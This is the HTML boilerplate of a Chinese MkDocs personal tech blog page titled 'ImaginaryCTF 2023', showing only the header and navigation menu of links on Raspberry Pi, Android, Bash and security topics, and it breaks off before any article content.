<!doctype html><html lang=zh class=no-js> <head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><link href=http://vjob.top/CTF/ImaginaryCTF-2023/ rel=canonical><link rel=icon href=../../assets/images/favicon.png><meta name=generator content="mkdocs-1.2.3, mkdocs-material-8.2.1"><title>ImaginaryCTF 2023 - 微站</title><link rel=stylesheet href=../../assets/stylesheets/main.e8d9bf0c.min.css><link rel=stylesheet href=../../assets/stylesheets/palette.e6a45f82.min.css><meta name=theme-color content=#ffffff><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Noto+Sans:300,400,400i,700%7CSource+Code+Pro&display=fallback"><style>:root{--md-text-font:"Noto Sans";--md-code-font:"Source Code Pro"}</style><script>__md_scope=new URL("../..",location),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script></head> <body dir=ltr data-md-color-scheme=preference data-md-color-primary=white data-md-color-accent=red> <input class=md-toggle data-md-toggle=drawer type=checkbox id=__drawer autocomplete=off> <input class=md-toggle data-md-toggle=search type=checkbox id=__search autocomplete=off> <label class=md-overlay for=__drawer></label> <div data-md-component=skip> <a href=#rsa class=md-skip> 跳转至 </a> </div> <div data-md-component=announce> </div> <header class="md-header md-header--lifted" data-md-component=header> <nav class="md-header__inner md-grid" aria-label=页眉> <a href=../.. title=微站 class="md-header__button md-logo" aria-label=微站 data-md-component=logo> <img src=../../img/avatar.png alt=logo> </a> <label class="md-header__button md-icon" for=__drawer> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg> </label> <div class=md-header__title data-md-component=header-title> <div class=md-header__ellipsis> <div class=md-header__topic> <span class=md-ellipsis> 微站 </span> </div> <div class=md-header__topic data-md-component=header-topic> <span class=md-ellipsis> ImaginaryCTF 2023 </span> </div> </div> </div> <label class="md-header__button md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg> </label> <div class=md-search data-md-component=search role=dialog> <label class=md-search__overlay for=__search></label> <div class=md-search__inner role=search> <form class=md-search__form name=search> <input type=text class=md-search__input name=query aria-label=搜索 placeholder=搜索 autocapitalize=off autocorrect=off autocomplete=off spellcheck=false data-md-component=search-query required> <label class="md-search__icon md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg> </label> <nav class=md-search__options aria-label=查找> <a href=javascript:void(0) class="md-search__icon md-icon" aria-label=分享 data-clipboard data-clipboard-text data-md-component=search-share tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7 0-.24-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91 1.61 0 2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08z"/></svg> </a> <button type=reset class="md-search__icon md-icon" aria-label=清空当前内容 tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg> </button> </nav> <div class=md-search__suggest data-md-component=search-suggest></div> </form> <div class=md-search__output> <div class=md-search__scrollwrap data-md-scrollfix> <div class=md-search-result data-md-component=search-result> <div class=md-search-result__meta> 正在初始化搜索引擎 </div> <ol class=md-search-result__list></ol> </div> </div> </div> </div> </div> </nav> <nav class=md-tabs aria-label=标签 data-md-component=tabs> <div class="md-tabs__inner md-grid"> <ul class=md-tabs__list> <li class=md-tabs__item> <a href=../.. class=md-tabs__link> 主页 </a> </li> <li class=md-tabs__item> <a href=../../RPI/Cloudflare%20Tunnel%E9%85%8D%E7%BD%AE%E5%A4%9A%E4%B8%AA%E5%9F%9F%E5%90%8D/ class=md-tabs__link> 树莓派 </a> </li> <li class=md-tabs__item> <a href=../../Android/Android10%E6%BA%90%E7%A0%81%E4%B8%8B%E8%BD%BD/ class=md-tabs__link> Android </a> </li> <li class=md-tabs__item> <a href=../../Bash/%E5%BA%94%E8%AF%A5%E7%9F%A5%E9%81%93%E7%9A%84Linux%E6%8A%80%E5%B7%A7/ class=md-tabs__link> Bash </a> </li> <li class=md-tabs__item> <a href=../../other/CTF%E5%B8%B8%E7%94%A8%E8%A7%A3%E5%AF%86%E8%84%9A%E6%9C%AC/ class=md-tabs__link> 安全 </a> </li> <li class=md-tabs__item> <a href=../MapleCTF2022_brsaby/ class="md-tabs__link md-tabs__link--active"> CTF </a> </li> <li class=md-tabs__item> <a href=../../%E5%8A%9F%E9%98%B2%E4%B8%96%E7%95%8C/misc_%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%902/ class=md-tabs__link> 功防世界 </a> </li> <li class=md-tabs__item> <a href=../../other/How%20to%20Get%20Rich/ class=md-tabs__link> 其它 </a> </li> </ul> </div> </nav> </header> <div class=md-container data-md-component=container> <main class=md-main data-md-component=main> <div class="md-main__inner md-grid"> <div class="md-sidebar md-sidebar--primary" data-md-component=sidebar data-md-type=navigation> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--primary md-nav--lifted" aria-label=导航栏 data-md-level=0> <label class=md-nav__title for=__drawer> <a href=../.. title=微站 class="md-nav__button md-logo" aria-label=微站 data-md-component=logo> <img src=../../img/avatar.png alt=logo> </a> 微站 </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_1 type=checkbox id=__nav_1> <label class=md-nav__link for=__nav_1> 主页 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=主页 data-md-level=1> <label class=md-nav__title for=__nav_1> <span class="md-nav__icon md-icon"></span> 主页 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../.. class=md-nav__link> 微站 </a> </li> <li class=md-nav__item> <a href=../../RPI/%E7%A1%AC%E7%9B%98%E5%90%AF%E5%8A%A8%E6%A0%91%E8%8E%93%E6%B4%BE%EF%BC%93B/ class=md-nav__link> 树莓派 </a> </li> <li class=md-nav__item> <a href=../../Android/Android10%E6%BA%90%E7%A0%81%E4%B8%8B%E8%BD%BD/ class=md-nav__link> Android </a> </li> <li class=md-nav__item> <a href=../../Bash/%E5%BA%94%E8%AF%A5%E7%9F%A5%E9%81%93%E7%9A%84Linux%E6%8A%80%E5%B7%A7/ class=md-nav__link> Bash </a> </li> <li class=md-nav__item> <a href=../../Android/Mobile%20Application%20Penetration%20Testing%20Cheat%20sheet%20with%20Tools%20%26%20Resources/ class=md-nav__link> 安全 </a> </li> <li class=md-nav__item> <a href=../../other/How%20to%20Get%20Rich/ class=md-nav__link> 其它 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2 type=checkbox id=__nav_2> <label class=md-nav__link for=__nav_2> 树莓派 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=树莓派 data-md-level=1> <label class=md-nav__title for=__nav_2> <span class="md-nav__icon md-icon"></span> 树莓派 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../RPI/Cloudflare%20Tunnel%E9%85%8D%E7%BD%AE%E5%A4%9A%E4%B8%AA%E5%9F%9F%E5%90%8D/ class=md-nav__link> Cloudflare Tunnel配置多个域名 </a> </li> <li class=md-nav__item> <a href=../../RPI/%E6%A0%91%E8%8E%93%E6%B4%BEUbuntu-Mate%E9%85%8D%E7%BD%AEDNS%E8%A7%A3%E6%9E%90/ class=md-nav__link> Ubuntu配置DNS解析 </a> </li> <li class=md-nav__item> <a href=../../RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85Ubuntu%20mate15.10-%E7%B3%BB%E7%BB%9F%E7%AC%94%E8%AE%B0_machh%E7%9A%84%E4%B8%93%E6%A0%8F-CSDN%E5%8D%9A%E5%AE%A2/ class=md-nav__link> 树莓派安装Ubuntu mate15.10 系统笔记 machh的专栏 CSDN博客 </a> </li> <li class=md-nav__item> <a href=../../RPI/%E7%A1%AC%E7%9B%98%E5%90%AF%E5%8A%A8%E6%A0%91%E8%8E%93%E6%B4%BE%EF%BC%93B/ class=md-nav__link> 硬盘启动树莓派３B </a> </li> <li class=md-nav__item> <a href=../../RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85JDK/ class=md-nav__link> 树莓派安装JDK </a> </li> <li class=md-nav__item> <a href=../../RPI/%E5%B0%86%E6%A0%91%E8%8E%93%E6%B4%BERaspberry%20Pi%E8%AE%BE%E7%BD%AE%E4%B8%BA%E6%97%A0%E7%BA%BF%E8%B7%AF%E7%94%B1%E5%99%A8%28WiFi%E7%83%AD%E7%82%B9AP%2CRTL8188CUS%E8%8A%AF%E7%89%87%29/ class=md-nav__link> 将树莓派Raspberry Pi设置为无线路由器(WiFi热点AP,RTL8188CUS芯片) </a> </li> <li class=md-nav__item> <a href=../../RPI/Using%20Raspberry%20Pi%20for%20Laravel%20developing/ class=md-nav__link> Using Raspberry Pi for Laravel developing </a> </li> <li class=md-nav__item> <a href=../../RPI/VNC%20setup%20on%20Raspberry%20Pi%20from%20Ubuntu/ class=md-nav__link> VNC setup on Raspberry Pi from Ubuntu </a> </li> <li class=md-nav__item> <a href=../../RPI/%E8%AE%BE%E7%BD%AE%E6%A0%91%E8%8E%93%E6%B4%BE%E4%BD%BF%E7%94%A8%E5%A4%96%E7%BD%AE%E7%A1%AC%E7%9B%98%E5%90%AF%E5%8A%A8/ class=md-nav__link> 设置树莓派使用外置硬盘启动 </a> </li> <li class=md-nav__item> <a href=../../RPI/%E6%8A%8A%E6%A0%91%E8%8E%93%E6%B4%BE%E5%8F%98%E6%88%9024%E5%B0%8F%E6%97%B6%E8%BF%90%E8%A1%8C%E7%9A%84%E4%B8%8B%E8%BD%BD%E7%A5%9E%E5%99%A8%EF%BC%88%E7%A7%8D%E5%AD%90%E3%80%81%E7%A3%81%E5%8A%9B%E9%93%BE%E9%80%9A%E9%80%9A%E6%94%AF%E6%8C%81%EF%BC%89/ class=md-nav__link> 把树莓派变成24小时运行的下载神器（种子、磁力链通通支持） </a> </li> <li class=md-nav__item> <a href=../../RPI/%E5%9C%A8%E6%A0%91%E8%8E%93%E6%B4%BE2%E4%B8%8A%E5%AE%89%E8%A3%85%20Chromium%20%E6%B5%8F%E8%A7%88%E5%99%A8%E5%8F%8A%20Google%20%E6%8B%BC%E9%9F%B3%E8%BE%93%E5%85%A5%E6%B3%95/ class=md-nav__link> 在树莓派2上安装 Chromium 浏览器及 Google 拼音输入法 </a> </li> <li class=md-nav__item> <a href=../../RPI/%E4%B8%BA%E6%A0%91%E8%8E%93%E6%B4%BEDIY%E4%B8%80%E6%AC%BE%E9%AB%98%E9%80%9F%E7%A8%B3%E5%AE%9A%E7%9A%84%E6%97%A0%E7%BA%BF%E7%BD%91%E5%8D%A1/ class=md-nav__link> 为树莓派DIY一款高速稳定的无线网卡 </a> </li> <li class=md-nav__item> <a href=../../RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B6%E2%80%94%E2%80%94%E6%A0%91%E8%8E%93%E6%B4%BE%E5%81%9Awifi%E7%83%AD%E7%82%B9_%E8%80%81%E5%BE%902014-CSDN%E5%8D%9A%E5%AE%A2_%E6%A0%91%E8%8E%93%E6%B4%BE%E5%81%9Awifi%E7%83%AD%E7%82%B9/ class=md-nav__link> 树莓派开发系列教程6——树莓派做wifi热点 老徐2014 CSDN博客 树莓派做wifi热点 </a> </li> <li class=md-nav__item> <a href=../../RPI/%E6%A0%91%E8%8E%93%E6%B4%BEwifi%E7%A0%B4%E8%A7%A3%E6%95%B4%E7%90%86%20-%20FindHao/ class=md-nav__link> 树莓派wifi破解整理 FindHao </a> </li> <li class=md-nav__item> <a href=../../RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E9%A6%99%E6%A9%99%E6%B4%BE%E6%97%A0%E7%BA%BF%E6%92%AD%E6%94%BE%EF%BC%8C%E5%AE%9E%E7%8E%B0DLNA%E4%B8%8EAirPlay%E5%8D%8F%E8%AE%AE%E6%97%A0%E7%BA%BF%E9%9F%B3%E7%AE%B1/ class=md-nav__link> 树莓派香橙派无线播放，实现DLNA与AirPlay协议无线音箱 </a> </li> <li class=md-nav__item> <a href=../../RPI/SSH%E9%80%9A%E8%BF%87%E4%BB%A3%E7%90%86%E8%BF%9E%E6%8E%A5/ class=md-nav__link> SSH通过代理连接 </a> </li> <li class=md-nav__item> <a href=../../RPI/Autossh%20and%20Systemd%20Service/ class=md-nav__link> Autossh and Systemd Service </a> </li> <li class=md-nav__item> <a href=../../RPI/Copying%20MySQL%20Databases%20to%20Another%20Machine/ class=md-nav__link> Copying MySQL Databases to Another Machine </a> </li> <li class=md-nav__item> <a href=../../RPI/How%20To%20Move%20a%20MySQL%20Data%20Directory%20to%20a%20New%20Location%20on%20Ubuntu%2016.04/ class=md-nav__link> How To Move a MySQL Data Directory to a New Location on Ubuntu 16.04 </a> </li> <li class=md-nav__item> <a href=../../RPI/Latest%20Version%20of%20Firefox%20and%20Thunderbird%20on%20a%20Raspberry%20Pi%20%5Bobsolete%5D/ class=md-nav__link> Latest Version of Firefox and Thunderbird on a Raspberry Pi [obsolete] </a> </li> <li class=md-nav__item> <a href=../../RPI/OpenWrt%20%E4%BD%BF%E7%94%A8%20frp%20%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%20%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C%20%E6%90%AD%E5%BB%BA%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%20%E6%96%87%E7%AB%A0%E8%AF%84%E8%AE%BA/ class=md-nav__link> OpenWrt 使用 frp 实现内网穿透 准备工作 搭建内网穿透 文章评论 </a> </li> <li class=md-nav__item> <a href=../../RPI/%E8%A7%A3%E5%86%B3%E6%A0%91%E8%8E%93%E6%B4%BESSH%E7%99%BB%E5%BD%95%E7%BC%93%E6%85%A2%E7%9A%84%E9%97%AE%E9%A2%98_Maoning%20Guan%E7%9A%84%E5%8D%9A%E5%AE%A2-CSDN%E5%8D%9A%E5%AE%A2/ class=md-nav__link> 解决树莓派SSH登录缓慢的问题 Maoning Guan的博客 CSDN博客 </a> </li> <li class=md-nav__item> <a href=../../RPI/Reading%20privileged%20memory%20with%20a%20side-channel/ class=md-nav__link> Reading privileged memory with a side channel </a> </li> <li class=md-nav__item> <a href=../../RPI/Install%20Latest%20ReadyMedia%20miniDLNA%20Raspberry%20Pi/ class=md-nav__link> Install Latest ReadyMedia miniDLNA Raspberry Pi </a> </li> <li class=md-nav__item> <a href=../../RPI/%E4%BD%BF%E7%94%A8%20vcgencmd%20%E6%8C%87%E4%BB%A4%E6%9F%A5%E7%9C%8B%20Raspberry%20Pi%20%E7%9A%84%20CPU%20%E6%BA%AB%E5%BA%A6%E3%80%81%E9%81%8B%E8%A1%8C%E9%80%9F%E5%BA%A6%E8%88%87%E9%9B%BB%E5%A3%93%E7%AD%89%E8%B3%87%E8%A8%8A/ class=md-nav__link> 使用 vcgencmd 指令查看 Raspberry Pi 的 CPU 溫度、運行速度與電壓等資訊 </a> </li> <li class=md-nav__item> <a href=../../RPI/Aria2%20%E7%BC%96%E8%AF%91%20%E6%B7%BB%E5%8A%A0%E6%94%AF%E6%8C%81BT%E4%B8%8B%E8%BD%BD%E7%9A%84%E5%8A%9F%E8%83%BD%EF%BC%88X86%E5%92%8Carmhf%E7%9A%84%E6%A0%91%E8%8E%93%E6%B4%BE2%EF%BC%89/ class=md-nav__link> Aria2 编译 添加支持BT下载的功能（X86和armhf的树莓派2） </a> </li> <li class=md-nav__item> <a href=../../RPI/Let%27s%20Encrypt%EF%BC%8C%E5%85%8D%E8%B4%B9%E5%A5%BD%E7%94%A8%E7%9A%84%20HTTPS%20%E8%AF%81%E4%B9%A6/ class=md-nav__link> Let's Encrypt，免费好用的 HTTPS 证书 </a> </li> <li class=md-nav__item> <a href=../../RPI/%E4%BD%BF%E7%94%A8SSH%E5%8F%8D%E5%90%91%E9%9A%A7%E9%81%93%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/ class=md-nav__link> 使用SSH反向隧道进行内网穿透 </a> </li> <li class=md-nav__item> <a href=../../RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%A9%E7%94%A8nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%EF%BC%8C%E6%88%90%E4%B8%BAIPv6_IPv4%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%88%E9%9C%80%E8%A6%81%E8%BF%9C%E7%A8%8B%E5%8F%8C%E6%A0%88%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89/ class=md-nav__link> 树莓派利用nginx反向代理，成为IPv6 IPv4公网服务器（需要远程双栈服务器） </a> </li> <li class=md-nav__item> <a href=../../RPI/%E5%A6%82%E4%BD%95%E5%9C%A8%E6%A0%91%E8%8E%93%E6%B4%BE%E4%B8%8A%E6%90%AD%E5%BB%BA%20WordPress/ class=md-nav__link> 如何在树莓派上搭建 WordPress </a> </li> <li class=md-nav__item> <a href=../../RPI/Install%20Redis%20on%20your%20Raspberry%20Pi/ class=md-nav__link> Install Redis on your Raspberry Pi </a> </li> <li class=md-nav__item> <a href=../../RPI/%E6%A0%91%E8%8E%93%E6%B4%BE4%E5%8F%98%E8%BA%AB%E6%97%81%E8%B7%AF%E7%94%B1/ class=md-nav__link> 树莓派4变身旁路由 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3 type=checkbox id=__nav_3> <label class=md-nav__link for=__nav_3> Android <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Android data-md-level=1> <label class=md-nav__title for=__nav_3> <span class="md-nav__icon md-icon"></span> Android </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../Android/Android10%E6%BA%90%E7%A0%81%E4%B8%8B%E8%BD%BD/ class=md-nav__link> Android10源码下载 </a> </li> <li class=md-nav__item> <a href=../../Android/%E5%B1%8F%E5%B9%95%E5%9D%8F%E4%B8%80%E5%8A%A0%E6%89%8B%E6%9C%BA%E5%88%B7android10/ class=md-nav__link> 屏幕坏一加手机刷android10 </a> </li> <li class=md-nav__item> <a href=../../Android/Enable%20ADB%20from%20recovery/ class=md-nav__link> Enable ADB from recovery </a> </li> <li class=md-nav__item> <a href=../../Android/Android%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90%E5%92%8Croot%E6%9D%83%E9%99%90/ class=md-nav__link> Android系统权限和root权限 </a> </li> <li class=md-nav__item> <a href=../../Android/%E3%80%90Android%20ROM%E5%AE%9A%E5%88%B6%E3%80%91CyanogenMod%E6%BA%90%E7%A0%81%E4%B8%8B%E8%BD%BD%E5%92%8C%E7%BC%96%E8%AF%91/ class=md-nav__link> 【Android ROM定制】CyanogenMod源码下载和编译 </a> </li> <li class=md-nav__item> <a href=../../Android/%E6%97%A5%E7%A7%AF%E6%9C%88%E7%B4%AF%EF%BC%9AProguard%E8%BF%9B%E8%A1%8C%E6%BA%90%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%B4%A9%E6%BA%83%E6%97%A5%E5%BF%97%E5%8F%8D%E6%B7%B7%E6%B7%86/ class=md-nav__link> 日积月累：Proguard进行源代码混淆和崩溃日志反混淆 </a> </li> <li class=md-nav__item> <a href=../../Android/10%20Ways%20to%20Improve%20Your%20Android%20App%27s%20Performance/ class=md-nav__link> 10 Ways to Improve Your Android App's Performance </a> </li> <li class=md-nav__item> <a href=../../Android/Anatomy%20of%20RecyclerView%3Aa%20Search%20for%20a%20ViewHolder/ class=md-nav__link> Anatomy of RecyclerView:a Search for a ViewHolder </a> </li> <li class=md-nav__item> <a href=../../Android/Android%E6%8F%92%E4%BB%B6%E5%8C%96%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90%E2%80%94%E2%80%94Hook%E6%9C%BA%E5%88%B6%E4%B9%8BBinder%20Hook/ class=md-nav__link> Android插件化原理解析——Hook机制之Binder Hook </a> </li> <li class=md-nav__item> <a href=../../Android/%E6%89%8B%E6%8A%8A%E6%89%8B%E6%95%99%E4%BD%A0%E5%BD%93%E5%BE%AE%E4%BF%A1%E8%BF%90%E5%8A%A8%E7%AC%AC%E4%B8%80%E5%90%8D%E2%80%93%E5%88%A9%E7%94%A8AndroidHook%E8%BF%9B%E8%A1%8C%E5%BE%AE%E4%BF%A1%E8%BF%90%E5%8A%A8%E4%BD%9C%E5%BC%8A/ class=md-nav__link> 手把手教你当微信运动第一名–利用AndroidHook进行微信运动作弊 </a> </li> <li class=md-nav__item> <a href=../../Android/Android%20%E5%8A%A8%E7%94%BB%E6%80%BB%E7%BB%93%20Android%20%E5%8A%A8%E7%94%BB%E6%80%BB%E7%BB%93/ class=md-nav__link> Android 动画总结 Android 动画总结 </a> </li> <li class=md-nav__item> <a href=../../Android/Android%E7%AD%BE%E5%90%8D%E6%80%BB%E7%BB%93/ class=md-nav__link> Android签名总结 </a> </li> <li class=md-nav__item> <a href=../../Android/Am%E5%91%BD%E4%BB%A4%E7%94%A8%E6%B3%95/ class=md-nav__link> Am命令用法 </a> </li> <li class=md-nav__item> <a href=../../Android/10%20Tips%20for%20using%20the%20Eclipse%20Memory%20Analyzer/ class=md-nav__link> 10 Tips for using the Eclipse Memory Analyzer </a> </li> <li class=md-nav__item> <a href=../../Android/android%E4%BD%BF%E7%94%A8ndk-stack%E8%B0%83%E8%AF%95JNI%E9%83%A8%E5%88%86%E7%9A%84C_C%2B%2B%E4%BB%A3%E7%A0%81/ class=md-nav__link> android使用ndk stack调试JNI部分的C C++代码 </a> </li> <li class=md-nav__item> <a href=../../Android/NativeActivity%E5%8E%9F%E7%90%86/ class=md-nav__link> NativeActivity原理 </a> </li> <li class=md-nav__item> <a href=../../Android/Using%20data%20binding%20in%20Android/ class=md-nav__link> Using data binding in Android </a> </li> <li class=md-nav__item> <a href=../../Android/Android%E4%B8%8AWebRTC%E4%BB%8B%E7%BB%8D/ class=md-nav__link> Android上WebRTC介绍 </a> </li> <li class=md-nav__item> <a href=../../Android/CoordinatorLayout%E9%AB%98%E7%BA%A7%E7%94%A8%E6%B3%95-%E8%87%AA%E5%AE%9A%E4%B9%89Behavior/ class=md-nav__link> CoordinatorLayout高级用法 自定义Behavior </a> </li> <li class=md-nav__item> <a href=../../Android/OpenSSL%E5%AE%9E%E8%B7%B5-Android%E4%B8%8B%E7%9A%84%E7%BC%96%E8%AF%91%E5%92%8C%E4%BD%BF%E7%94%A8/ class=md-nav__link> OpenSSL实践 Android下的编译和使用 </a> </li> <li class=md-nav__item> <a href=../../Android/%E4%BD%BF%E7%94%A8ShareSDK%E5%AE%8C%E6%88%90%E7%AC%AC%E4%B8%89%E6%96%B9%EF%BC%88QQ%E3%80%81%E5%BE%AE%E4%BF%A1%E3%80%81%E5%BE%AE%E5%8D%9A%EF%BC%89%E7%99%BB%E5%BD%95%E5%92%8C%E5%88%86%E4%BA%AB/ class=md-nav__link> 使用ShareSDK完成第三方（QQ、微信、微博）登录和分享 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4 type=checkbox id=__nav_4> <label class=md-nav__link for=__nav_4> Bash <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Bash data-md-level=1> <label class=md-nav__title for=__nav_4> <span class="md-nav__icon md-icon"></span> Bash </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../Bash/%E5%BA%94%E8%AF%A5%E7%9F%A5%E9%81%93%E7%9A%84Linux%E6%8A%80%E5%B7%A7/ class=md-nav__link> 应该知道的Linux技巧 </a> </li> <li class=md-nav__item> <a href=../../Bash/%E4%BC%98%E9%9B%85%E5%9C%B0%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E8%A1%8C%EF%BC%9ATmux%20%E7%BB%88%E7%AB%AF%E5%A4%8D%E7%94%A8/ class=md-nav__link> 优雅地使用命令行：Tmux 终端复用 </a> </li> <li class=md-nav__item> <a href=../../Bash/%E6%88%91%E7%9A%84ImageMagick%E4%BD%BF%E7%94%A8%E5%BF%83%E5%BE%97/ class=md-nav__link> 我的ImageMagick使用心得 </a> </li> <li class=md-nav__item> <a href=../../Bash/gdbcomm/ class=md-nav__link> Gdbcomm </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_5 type=checkbox id=__nav_5> <label class=md-nav__link for=__nav_5> 安全 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=安全 data-md-level=1> <label class=md-nav__title for=__nav_5> <span class="md-nav__icon md-icon"></span> 安全 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../other/CTF%E5%B8%B8%E7%94%A8%E8%A7%A3%E5%AF%86%E8%84%9A%E6%9C%AC/ class=md-nav__link> CTF常用解密脚本 </a> </li> <li class=md-nav__item> <a href=../../other/CTF%E5%B8%B8%E7%94%A8RSA%E6%8A%80%E5%B7%A7/ class=md-nav__link> CTF常用RSA技巧 </a> </li> <li class=md-nav__item> <a href=../../other/CTF%E4%B8%AD%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/ class=md-nav__link> CTF中的序列化与反序列化 </a> </li> <li class=md-nav__item> <a href=../../other/RSA/ class=md-nav__link> RSA </a> </li> <li class=md-nav__item> <a href=../../other/SageMath%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/ class=md-nav__link> SageMath常用函数 </a> </li> <li class=md-nav__item> <a href=../../Android/Mobile%20Application%20Penetration%20Testing%20Cheat%20sheet%20with%20Tools%20%26%20Resources/ class=md-nav__link> Mobile Application Penetration Testing Cheat sheet with Tools & Resources </a> </li> <li class=md-nav__item> <a href=../../other/Most%20Important%20Network%20Penetration%20Testing%20Tools%20for%20Hackers%20%26%20Security%20Professionals/ class=md-nav__link> Most Important Network Penetration Testing Tools for Hackers & Security Professionals </a> </li> <li class=md-nav__item> <a href=../../other/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/ class=md-nav__link> 缓冲区溢出攻击实验 </a> </li> <li class=md-nav__item> <a href=../../other/%E5%B7%A7%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F/ class=md-nav__link> 巧用命令注入的N种方式 </a> </li> <li class=md-nav__item> <a href=../../other/Smashing%20the%20Stack%20for%20Fun%20and%20Profit%20by%20Aleph%20One/ class=md-nav__link> Smashing the Stack for Fun and Profit by Aleph One </a> </li> <li class=md-nav__item> <a href=../../Android/Bad%20Binder%3AAndroid%20In-The-Wild%20Exploit/ class=md-nav__link> Bad Binder:Android In The Wild Exploit </a> </li> <li class=md-nav__item> <a href=../../other/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%99%E7%82%B9%E6%94%B6%E9%9B%86/ class=md-nav__link> 信息安全站点收集 </a> </li> <li class=md-nav__item> <a href=../../other/%E7%8E%8B%E5%AD%90%E4%BA%AD%E7%9A%84%E5%8D%9A%E5%AE%A2%20GPG%20%E4%B8%8E%E7%AB%AF%E5%88%B0%E7%AB%AF%E5%8A%A0%E5%AF%86%EF%BC%9A%E8%AE%BA%E4%BB%80%E4%B9%88%E6%89%8D%E6%98%AF%E5%8F%AF%E4%BB%A5%E4%BF%A1%E4%BB%BB%E7%9A%84/ 